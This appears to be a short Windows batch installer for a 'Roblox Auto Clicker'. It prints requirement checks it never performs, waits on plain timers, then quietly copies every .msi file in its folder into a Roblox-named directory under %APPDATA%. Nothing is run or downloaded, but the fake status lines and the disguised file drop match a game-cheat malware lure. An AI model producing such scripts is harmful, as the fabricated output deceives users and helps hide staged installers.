@echo off
echo ============================================
echo   Roblox Auto Clicker - Installer
echo ============================================
echo.
echo Checking requirements...
timeout /t 1 /nobreak >nul
echo [OK] Windows version compatible
echo [OK] .NET Runtime detected
echo.
echo Installing Roblox Auto Clicker...
timeout /t 2 /nobreak >nul
mkdir "%APPDATA%\Roblox" 2>nul
copy /Y "*.msi" "%APPDATA%\Roblox\" >nul
echo.
echo [OK] Installation complete!
pause
